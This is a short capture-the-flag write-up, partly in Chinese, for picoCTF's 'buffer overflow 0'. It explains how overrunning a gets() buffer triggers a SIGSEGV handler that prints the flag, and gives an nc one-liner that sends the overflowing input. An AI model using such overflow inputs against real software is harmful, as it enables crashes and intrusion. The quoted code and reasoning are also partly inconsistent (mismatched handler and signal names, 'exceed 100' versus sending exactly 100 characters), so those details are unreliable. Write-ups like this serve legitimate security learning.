# buffer overflow 0

## Information

### Description

Smash the stack
Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using:
nc saturn.picoctf.net 51110

### Hints

1. How can you trigger the flag to print?

2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

3. Run man gets and read the BUGS section. How many characters can the program really read?

## Solution

1. Discovery
    * vuln: ELF 32-bit 
    * vuln.c: c source code

2. Research
    * 觀察 code 可以從第31行發現 SIGSEV 的 signal handler 被自定義為 **sigsev_handler()**，且該函數會輸出 flag，如何觸發 **sigsegv_handler** 就變成獲取 flag 的關鍵。
        ```c
            ...
            void sigsev_handler(int sig) {
                printf("%s\n", flag);
                fflush(stdout);
                exit(1);
            }
            ...
            int main() {
                ...
                signal(SIGSEV, sigsegv_handler);
                ...
            }
        ```

    * 注意 39-40 行， buffer 被宣告為大小 100 的 char array，意旨大小最多 100 位不包括 '\0'，所以只要使輸入超過 100 大小即可觸發
        * SIGSEV: segmantation violation，是指當一個行程執行了一個無效的記憶體參照，或發生區段錯誤時傳送給它的訊號。
        ```c
            char buf1[100];
            gets(buf1);
        ```

3. Exploitation
    * 觸發 SIGSEV
        ```sh
            $ python -c "print('a'*100)" | nc saturn.picoctf.net 51110
        ```
